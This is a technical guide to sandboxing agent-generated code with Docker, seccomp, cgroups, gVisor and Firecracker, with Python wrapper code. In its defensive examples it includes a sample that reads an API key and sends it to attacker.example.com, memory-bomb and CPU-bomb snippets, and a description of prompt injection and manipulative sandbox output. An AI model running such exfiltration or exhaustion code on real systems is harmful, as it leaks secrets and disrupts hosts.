content.text: Execution sandboxing is the practice of running untrusted or agent-generated code inside a strictly bounded environment that limits what the process can observe, modify, or communicate with. When an AI agent generates Python, shell commands, or tool invocations at runtime, the host system cannot know in advance whether that code is safe — it may attempt to read credentials, spawn network connections, delete files, or exhaust system resources. A sandbox intercepts these capabilities at the OS or hypervisor level before they can cause harm, while still allowing the computation itself to succeed and return a result.

Unlike application-level input filtering, which operates on text before execution begins, sandboxing enforces constraints at the system call layer, the container boundary, or the virtual machine interface. This makes it the last line of defense against code that is syntactically valid but semantically dangerous. Execution sandboxing is a foundational control in any agentic AI system that can generate and run code — code interpreters, automated data pipelines, multi-agent tool use, and CI/CD automation driven by LLMs all depend on it.

At its core, execution sandboxing creates a controlled execution context with a defined permission surface. The sandbox exposes a subset of OS capabilities to the running process and denies everything else by default. The key dimensions of isolation are:
(which paths can be read or written),
(whether the code can fork child processes or exec other binaries),
(CPU time, memory, disk, file descriptors), and

Implementation techniques range from lightweight OS-level primitives — Linux namespaces, cgroups, and seccomp-BPF — to heavier-weight solutions like Docker containers, gVisor (a userspace kernel that intercepts syscalls), Firecracker microVMs (which run each execution in a dedicated mini-virtual-machine), and WebAssembly runtimes. The appropriate technique depends on the threat model, the acceptable latency overhead, and the operational complexity the team can sustain. Each step up in isolation strength generally brings a step up in startup cost and operational burden.

A sandbox is not only a security control — it is also a reliability and predictability control. By bounding resource usage, sandboxed code cannot cause cascading failures in the host. By restricting filesystem mutations, a failed sandbox run leaves the host in a known-good state. These properties matter enormously in agentic pipelines where a single bad tool call could otherwise corrupt shared state used by subsequent steps.

Large language models are generative: they produce code that was not written by a human reviewer and was not tested against a fixed specification. Even a well-aligned model makes mistakes, and adversarial inputs (prompt injection, poisoned tool outputs, crafted user messages) can steer model-generated code toward malicious behavior. Without sandboxing, a single compromised execution can exfiltrate secrets, destroy data, or pivot into the broader infrastructure.

The stakes scale with capability. An agent that can only return text has limited blast radius. An agent that can execute code, read files, and make HTTP requests — but does so without sandboxing — is effectively an unauthenticated remote code execution surface. As agentic systems acquire more capabilities (web browsing, database access, shell execution), the sandboxing layer becomes the principal boundary between intended automation and catastrophic failure.

Regulatory and compliance pressures reinforce this. Systems that process user data under GDPR, HIPAA, or SOC 2 frameworks must demonstrate that untrusted code cannot reach regulated data stores. Sandboxing provides a technical control that satisfies this requirement in a way that policy alone cannot.
Containment of malicious or buggy code:
Code that attempts filesystem writes, network connections, or process spawning is blocked at the kernel layer before damage occurs.
CPU, memory, and wall-clock limits prevent runaway loops or memory bombs from degrading the host or other concurrent executions.
Each sandbox run starts from a known filesystem snapshot, eliminating state contamination between executions.
System call logs, network traces, and resource usage metrics captured inside the sandbox provide a forensic record of exactly what agent-generated code did.
Sandboxing acts as the backstop layer after input validation and policy checks fail — the security guarantee does not depend on upstream controls being perfect.
Demonstrable isolation of untrusted code from regulated data satisfies technical control requirements in SOC 2, ISO 27001, and similar frameworks.
Container startup adds 50–500 ms; microVM startup can add 100–1500 ms. For interactive agents this latency is often noticeable and may require pre-warming pools.
Running and monitoring sandboxed execution infrastructure (container registries, snapshot management, cleanup pipelines) requires dedicated platform engineering effort.
Legitimate agent tasks that require network access or specific filesystem paths must be explicitly permitted. Allowlists drift over time and require governance.
Process-level isolation (e.g., bare chroot without namespaces) is much weaker than container or VM isolation. Using the wrong technique for the threat model creates false confidence.
The sandbox image must include every library the agent-generated code might need. Stale or missing dependencies cause runtime failures that are hard to debug inside the sandbox.

Execution sandboxing assembles several OS-level mechanisms into a coherent policy boundary. On Linux, the key primitives are namespaces (which partition global resources like PIDs, network interfaces, and mount points), cgroups (which limit and account for resource consumption), and seccomp-BPF (which filters system calls to an allowlist). Together they form the foundation of Docker containers and are also used directly by runtimes like gVisor.

Control groups (cgroups) allow the kernel to limit and measure the resource usage of a group of processes. The critical limits for agent code execution are: CPU quota (e.g., 50% of one core), memory high-water-mark (e.g., 256 MiB, with an OOM kill at 512 MiB), maximum number of open file descriptors, and wall-clock time enforced externally via a watchdog. A process group exceeding its memory limit receives SIGKILL before it can affect the host.

is typically set separately from the CPU quota because an I/O-blocked process can run for a long time without consuming CPU cycles. Both limits are needed: the CPU quota prevents compute exhaustion, and
prevents an agent execution from blocking a slot indefinitely on a hung network call.

Mount namespaces let the sandbox present the process with a private root filesystem derived from a read-only base image. Writes are redirected to an ephemeral overlay layer that is discarded after execution. The process sees
as its writable workspace but cannot reach
, or any host path outside the overlay. This is the mechanism Docker uses for container file systems.

seccomp-BPF attaches a BPF program to a process that the kernel executes on every system call. The program inspects the syscall number and arguments and returns ALLOW, ERRNO (to simulate a permission error), or KILL. A typical Python execution sandbox allows ~60 of the ~400 available Linux syscalls: the ones needed for memory allocation, I/O, process exit, and basic file operations, while blocking
. This provides a narrow kernel attack surface even if the process manages to exploit a container breakout vulnerability.

The diagram below shows the full request flow for agent-generated code execution. The agent emits a tool call, which passes through a policy gate (checking the operation type, requested capabilities, and caller identity) before being routed into the sandbox boundary. Inside the sandbox, code executes against a restricted filesystem and without network access. The result exits through an output sanitization step and is logged to the audit layer.

attrs.alt: Execution Sandboxing Architecture: Agent -> Policy Gate -> Sandbox (restricted FS, no network, resource limits) -> Sanitized Output -> Audit
attrs.title: Execution Sandboxing Architecture

content.text: When to Use It (and When Not To)
The agent generates and executes code at runtime — code interpreters, data analysis agents, automated test runners, or build pipelines.
Tool inputs can contain attacker-controlled content — documents, emails, web pages, or user-uploaded files that the agent processes.
The system is multi-tenant — different users' agent executions must not be able to observe or affect each other's data.
The blast radius of a compromised execution must be bounded — particularly when the agent has access to databases, secrets, or external APIs.
Compliance requires demonstrable technical isolation of untrusted computation from regulated data stores.
Do not rely on sandboxing alone when

Legitimate functionality requires the capabilities you are trying to block — for example, an agent that genuinely needs outbound HTTP should have those calls go through a monitored proxy, not bypass sandboxing entirely.
The sandbox technology is poorly matched to the threat model — a bare chroot without namespaces does not prevent privilege escalation and should not be used for hostile code.
The system has no input validation or policy layer — sandboxing is the last line of defense, not the only one. Shallow sandboxing with no upstream filters is insufficient for high-stakes systems.
The following step-by-step approach targets a Python-based agentic system that needs to execute agent-generated code safely on Linux using Docker as the sandbox runtime.
), install only the packages the sandbox needs, create a non-root user, and remove shells (
Set memory limits (e.g., 256 MiB), CPU quotas (e.g., 0.5 CPU), no-new-privileges flags, read-only root filesystem, and a writable tmpfs for the workspace.
Use Docker's default seccomp profile as a baseline, then further restrict by dropping network-related syscalls (
for complete network isolation, or attach to a proxy-only network for permitted outbound calls.
Inject the generated code and workspace:
Write the code to a tempfile, bind-mount it read-only into the container, and run
Capture stdout and stderr with a timeout. Truncate output at a configured max size. Return the exit code, stdout, stderr, and resource usage metrics to the calling agent.
Remove the container immediately after execution. Emit a structured audit log entry containing the code hash, execution time, resource usage, exit code, and calling agent identity.

import subprocess
import tempfile
import os
import json
import hashlib
import time
from pathlib import Path


def run_sandboxed(
    code: str,
    timeout: int = 10,
    memory_mb: int = 256,
    cpu_fraction: float = 0.5,
) -> dict:
    """
    Execute agent-generated Python code in a Docker sandbox.

    Returns a dict with keys: exit_code, stdout, stderr, duration_s, error.
    """
    code_hash = hashlib.sha256(code.encode()).hexdigest()[:12]

    with tempfile.TemporaryDirectory() as tmpdir:
        code_path = Path(tmpdir) / "code.py"
        code_path.write_text(code)

        docker_cmd = [
            "docker", "run",
            "--rm",                              # remove container on exit
            "--network=none",                    # no network access
            "--read-only",                       # read-only root filesystem
            "--tmpfs", "/tmp:size=64m",          # writable tmpfs for /tmp only
            "--tmpfs", "/sandbox/workspace:size=128m",
            "--memory", f"{memory_mb}m",
            "--memory-swap", f"{memory_mb}m",   # disable swap
            "--cpus", str(cpu_fraction),
            "--security-opt", "no-new-privileges",
            "--cap-drop", "ALL",                 # drop all Linux capabilities
            "-v", f"{code_path}:/sandbox/code.py:ro",
            "--user", "65534:65534",             # nobody:nogroup
            "python:3.12-slim",
            "python", "/sandbox/code.py",
        ]

        start = time.monotonic()
        try:
            result = subprocess.run(
                docker_cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
            )
            duration = time.monotonic() - start
            return {
                "exit_code": result.returncode,
                "stdout": result.stdout[:32_768],   # cap at 32 KiB
                "stderr": result.stderr[:8_192],
                "duration_s": round(duration, 3),
                "code_hash": code_hash,
                "error": None,
            }
        except subprocess.TimeoutExpired:
            duration = time.monotonic() - start
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": "",
                "duration_s": round(duration, 3),
                "code_hash": code_hash,
                "error": f"Execution timed out after {timeout}s",
            }
        except Exception as exc:
            return {
                "exit_code": -1,
                "stdout": "",
                "stderr": "",
                "duration_s": 0.0,
                "code_hash": code_hash,
                "error": str(exc),
            }
Example 1: Blocking a network exfiltration attempt
The following example shows that malicious agent-generated code that attempts to open a network socket is killed before it can reach the internet:

# Agent-generated code that attempts network exfiltration
malicious_code = """
import socket
import os

# Attempt to read a secret and exfiltrate it
secret = os.environ.get("API_KEY", "not-found")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.example.com", 4444))
s.sendall(secret.encode())
s.close()
print("done")
"""

result = run_sandboxed(malicious_code, timeout=5)
# With --network=none, socket.connect() raises OSError: [Errno 101] Network is unreachable
# or the syscall is blocked by seccomp with EPERM / EACCES
print(result["exit_code"])   # non-zero (1 or -1)
print(result["stderr"])      # contains the Python traceback


# Safe code runs normally in the same sandbox
safe_code = """
data = [1, 2, 3, 4, 5]
result = sum(x**2 for x in data)
print(result)   # 55
"""

result = run_sandboxed(safe_code)
print(result["exit_code"])   # 0
print(result["stdout"])      # "55\n"
Example 2: Enforcing memory and CPU limits

# Memory bomb — generates a list consuming gigabytes of RAM
memory_bomb = """
data = []
while True:
    data.append(b"x" * 10_000_000)  # 10 MB per iteration
"""

result = run_sandboxed(memory_bomb, timeout=10, memory_mb=128)
# Container is OOM-killed by the kernel before it reaches 128 MiB
print(result["exit_code"])   # 137 (SIGKILL) or -1 (timeout)
print(result["error"])


# CPU bomb — busy loop
cpu_bomb = """
x = 0
while True:
    x += 1
"""

result = run_sandboxed(cpu_bomb, timeout=3, cpu_fraction=0.25)
# Times out after 3 seconds; host CPU load is bounded to 0.25 core
print(result["error"])       # "Execution timed out after 3s"
Real-World Example: Agent-Driven Data Analysis Pipeline

Consider a production analytics assistant where users describe data transformations in natural language and the LLM generates Pandas code that runs against the user's uploaded CSV. Without sandboxing, a malicious user could craft a prompt that causes the model to generate code reading server credentials or making HTTP calls. With sandboxing, each generated code snippet runs in an isolated microenvironment.

import anthropic
import json
from pathlib import Path


SYSTEM_PROMPT = """You are a data analysis assistant. When asked to analyze data,
respond ONLY with executable Python code that:
- Reads data from /sandbox/workspace/data.csv using pandas
- Prints results as JSON to stdout
- Uses no network calls, no file writes outside /sandbox/workspace, no subprocesses
"""

client = anthropic.Anthropic()


def analyze_with_sandbox(user_query: str, csv_path: Path) -> dict:
    """
    LLM generates analysis code; sandbox executes it safely.
    """
    # Step 1: LLM generates code
    response = client.messages.create(
        model="claude-opus-4-5",
        max_tokens=1024,
        system=SYSTEM_PROMPT,
        messages=[{"role": "user", "content": user_query}]
    )
    generated_code = response.content[0].text.strip()

    # Strip markdown code fences if present
    if generated_code.startswith("```"):
        lines = generated_code.split("\n")
        generated_code = "\n".join(lines[1:-1])

    # Step 2: Mount CSV into sandbox workspace and execute
    # (Simplified: in production, use bind-mounts per run_sandboxed)
    result = run_sandboxed_with_data(generated_code, csv_path, timeout=15)

    if result["exit_code"] != 0:
        return {"error": result["stderr"], "code": generated_code}

    # Step 3: Parse JSON output from sandbox stdout
    try:
        output = json.loads(result["stdout"])
    except json.JSONDecodeError:
        output = {"raw": result["stdout"]}

    return {
        "output": output,
        "duration_s": result["duration_s"],
        "code_hash": result["code_hash"],
    }


def run_sandboxed_with_data(code: str, data_path: Path, timeout: int) -> dict:
    """Extend run_sandboxed to bind-mount a data file into the workspace."""
    import subprocess, tempfile, time, hashlib
    code_hash = hashlib.sha256(code.encode()).hexdigest()[:12]

    with tempfile.TemporaryDirectory() as tmpdir:
        code_file = Path(tmpdir) / "code.py"
        code_file.write_text(code)

        cmd = [
            "docker", "run", "--rm",
            "--network=none",
            "--read-only",
            "--tmpfs", "/sandbox/workspace:size=256m",
            "--memory", "512m", "--memory-swap", "512m",
            "--cpus", "1.0",
            "--security-opt", "no-new-privileges",
            "--cap-drop", "ALL",
            "-v", f"{code_file}:/sandbox/code.py:ro",
            "-v", f"{data_path}:/sandbox/workspace/data.csv:ro",
            "--user", "65534:65534",
            "sandbox-pandas:latest",   # image with pandas pre-installed
            "python", "/sandbox/code.py",
        ]
        start = time.monotonic()
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return {
                "exit_code": r.returncode,
                "stdout": r.stdout[:65_536],
                "stderr": r.stderr[:8_192],
                "duration_s": round(time.monotonic() - start, 3),
                "code_hash": code_hash,
                "error": None,
            }
        except subprocess.TimeoutExpired:
            return {"exit_code": -1, "stdout": "", "stderr": "",
                    "duration_s": timeout, "code_hash": code_hash,
                    "error": f"Timeout after {timeout}s"}
Running as root inside the container

A container running as root (UID 0) can write to system directories inside the container and is more dangerous if the container runtime has a kernel vulnerability. Always specify a non-privileged user.

# WRONG: container runs as root by default
cmd_wrong = [
    "docker", "run", "--rm",
    "--network=none",
    "python:3.12-slim",
    "python", "/code.py",
]

# RIGHT: run as nobody (UID 65534)
cmd_right = [
    "docker", "run", "--rm",
    "--network=none",
    "--read-only",
    "--tmpfs", "/tmp:size=32m",
    "--security-opt", "no-new-privileges",
    "--cap-drop", "ALL",
    "--user", "65534:65534",          # nobody:nogroup
    "python:3.12-slim",
    "python", "/sandbox/code.py",
]

# WRONG: no memory limit allows a single container to exhaust host RAM
cmd_no_limit = ["docker", "run", "--rm", "python:3.12-slim", "python", "/code.py"]

# RIGHT: always set both --memory and --memory-swap
cmd_with_limits = [
    "docker", "run", "--rm",
    "--memory", "256m",
    "--memory-swap", "256m",   # same value disables swap
    "--cpus", "0.5",
    "python:3.12-slim",
    "python", "/code.py",
]
A CPU limit alone does not prevent a process that is sleeping or blocked on I/O from holding a sandbox slot open indefinitely. Always combine CPU limits with an external wall-clock timeout via
and forcibly kill the container if it exceeds the deadline.
Trusting stderr as a safe channel

Agent-generated code can write arbitrary content to stderr. If the calling system logs or surfaces stderr without sanitization, it creates a secondary injection channel. Always truncate and sanitize stderr before displaying it or passing it back to the agent as context.
Build and version-pin sandbox images in CI. Never install packages at runtime — a network-accessible package installer inside the sandbox negates isolation.
Keep a pool of pre-started sandbox containers in a waiting state to reduce per-execution startup latency from ~300 ms to ~10 ms.
Use heavier isolation (Firecracker microVMs) for executions from untrusted external users, and lighter isolation (Docker) for internal agent use cases with lower risk.
Cap stdout at 32–64 KiB and stderr at 8 KiB. Large outputs can be stored to an ephemeral object store with a reference returned instead.

Log the SHA-256 of every executed code snippet, the requesting agent ID, execution duration, peak memory, and exit code. This enables forensic reconstruction of what happened in a multi-step agent workflow.
Include sandbox escape attempts in your red-team and penetration testing scope. Container runtime CVEs (like runc vulnerabilities) can break isolation; track CVE feeds for your container runtime.
Remove interpreters, shells, and package managers from the sandbox image. A Python sandbox does not need
Sandbox overhead is dominated by startup time and image layer I/O. The table below compares representative isolation technologies on typical latency and throughput characteristics.

For interactive agents where latency matters, the pre-warmed container pool pattern is essential: maintain N idle sandbox containers ready to accept code. Execution latency drops to the time needed to write the code file and start the Python interpreter inside an already-running container. Horizontal scaling is straightforward — each sandbox is stateless and independent, so capacity scales linearly with worker count.

Throughput is primarily bounded by container startup concurrency (for cold-start scenarios) and by disk I/O for overlay filesystem writes. Using memory-backed overlay (tmpfs) rather than disk-backed overlay removes the disk I/O bottleneck and dramatically improves throughput under load.
The most widely deployed container runtime. Provides namespaces, cgroups, and seccomp out of the box. Use the Docker SDK for Python (
package) for programmatic container management from Python agent code.

Google's userspace kernel that intercepts all syscalls and re-implements them in a safe Go-based kernel, eliminating direct access to the host kernel. Drop-in replacement for runc in Docker. Best for high-security multi-tenant scenarios.

AWS's open-source microVM hypervisor, designed specifically for serverless and multi-tenant workloads. Provides hardware-level isolation (KVM) with ~125 ms boot time. Powers AWS Lambda and Fargate. Use via the Firecracker SDK or the firecracker-containerd integration.
WebAssembly runtimes that enforce memory safety and capability-based security at the instruction level. Excellent for languages that compile to WASM. For Python,
brings CPython to WASM, enabling Python execution in a browser or Wasmtime sandbox.

A Python-specific AST-rewriting library that restricts which builtins, attributes, and operations code can use. Lightweight (no container overhead) but weaker than OS-level isolation — treat it as a supplementary layer, not a primary sandbox.

Google's lightweight process isolation tool that uses Linux namespaces and seccomp directly, without the Docker daemon overhead. Suitable for high-throughput scenarios where container daemon latency is unacceptable.

A managed cloud sandbox API designed for AI code execution. Provides pre-built sandboxes with Python, Node.js, and common data science libraries, accessible via a simple SDK. Suitable for teams that do not want to operate sandbox infrastructure themselves.
Execution sandboxing is one of several approaches to controlling agent-generated code. The table below compares the main alternatives across the dimensions that matter for agentic AI systems.

Vulnerabilities in the container runtime (runc, containerd) can allow breakout to the host. Mitigate by using gVisor or Firecracker for high-risk workloads, keeping the container runtime patched, and running containers on a dedicated node pool that has no access to production infrastructure.

Shared kernel architecture allows timing-based information leakage between containers. For strict multi-tenant isolation, use hardware-level separation (Firecracker on dedicated hosts, or physical node-per-tenant allocation).

Many concurrent sandbox executions can saturate the host's CPU or memory even with per-container limits. Implement a concurrency cap (semaphore) at the orchestration layer to bound the number of simultaneous executions.
Containers that are not cleaned up after timeout can accumulate and exhaust file descriptors or network namespaces. Always use
or implement an explicit container cleanup sweep.
Do not pass API keys, database credentials, or session tokens as environment variables to the sandbox container. Agent-generated code can trivially read

Sandbox stdout is returned to the agent as context. Malicious code can craft stdout that looks like a system message or tool response, attempting to manipulate the next model inference. Always clearly frame sandbox output as user-generated content, not trusted instructions.
Think of an execution sandbox as a

. Every time agent-generated code needs to run, you set up a fresh bench stocked only with the specific instruments the task needs, run the experiment, record the results, then burn the bench down entirely — regardless of what the experiment did to it. The next experiment gets an identical fresh bench.

: instead of trying to detect and block all the bad things code might do, you remove the ability to do those things in the first place. Code that has no network access cannot exfiltrate data, regardless of how clever the exfiltration attempt is. Code running with no-new-privileges cannot gain root even if it finds a setuid binary. The sandbox does not need to know what the code is trying to do — it simply does not provide the capability.

Principle of least privilege applied to execution: grant the minimum set of OS capabilities needed for the code to do its job, and deny everything else by default. The sandbox enforces this principle at the kernel layer, independent of whether the agent, the LLM, or any upstream filter made the right decision.

When multiple agents interact — an orchestrator delegating subtasks to specialist sub-agents, each of which may execute code — the isolation requirements compound. A sub-agent's sandbox must be isolated not only from the host but also from other sub-agents' sandboxes. Shared state (files, databases, message queues) becomes a lateral-movement path: a compromised sub-agent that can write to a shared directory can inject malicious data into another agent's context.
The correct architecture for multi-agent sandboxing is

: each agent execution gets its own ephemeral sandbox, and the only communication channel between agents is a structured message interface (an API or message queue) that is itself subject to validation. There should be no shared filesystem between agent sandboxes.
Use an explicit API between agents. Validate the schema and size of every inter-agent message at the receiving sandbox boundary.
Separate sandbox pools per agent role:
An agent that processes user-uploaded documents should run in a more restrictive sandbox than an agent that only summarizes pre-validated internal data.
Trace request IDs across sandbox boundaries so you can reconstruct the complete execution graph of a multi-agent workflow in the event of an incident.

Run the sandbox execution service as a separate microservice from the agent orchestrator. The orchestrator sends code-execution requests over a local UNIX socket or loopback HTTP API. This architectural separation means the sandbox service can be updated, scaled, or replaced independently — and a vulnerability in the sandbox service does not have direct access to the orchestrator's memory or secrets.

AWS Lambda, Google Cloud Run, and Cloudflare Workers each provide ephemeral, isolated execution environments with configurable resource limits. Using a managed serverless function as the sandbox eliminates the need to operate container infrastructure and provides natural per-invocation isolation. The trade-off is cold-start latency (50–500 ms for Lambda) and reduced control over the seccomp profile and filesystem layout.

For organizations that cannot use cloud-managed execution services due to data residency requirements, running Firecracker microVMs on bare-metal or KVM-enabled VMs provides near-cloud-grade isolation with full control over the execution environment. Firecracker's

Firecracker's jailer process further restricts the VMM's own capabilities using seccomp and cgroups before the microVM boots, providing defense-in-depth at the hypervisor layer as well as the guest layer.
Execution sandboxing is mandatory for any agentic system that generates and runs code at runtime — it is the difference between automation and uncontrolled remote code execution.

The core strategy is capability minimization: remove network access, restrict filesystem writes to a tmpfs workspace, block process creation and sensitive syscalls, and enforce hard CPU/memory/time limits.
Choose isolation technology to match your threat model — Docker for most use cases, gVisor or Firecracker for high-security or multi-tenant scenarios where kernel exploit risk is material.
Pre-warm container pools to reduce sandbox startup latency from hundreds of milliseconds to single-digit milliseconds, making sandboxed execution practical for interactive agents.
Sandbox output is untrusted content — truncate, sanitize, and clearly frame it as agent-generated before returning it to the model as context to prevent output injection attacks.
In multi-agent systems, use sandbox-per-agent-per-turn with message-passing between agents instead of shared filesystems to prevent lateral movement across the agent graph.
Audit every sandbox execution: log the code hash, agent identity, resource usage, and exit code to maintain a forensic record that enables incident reconstruction across multi-step agent workflows.
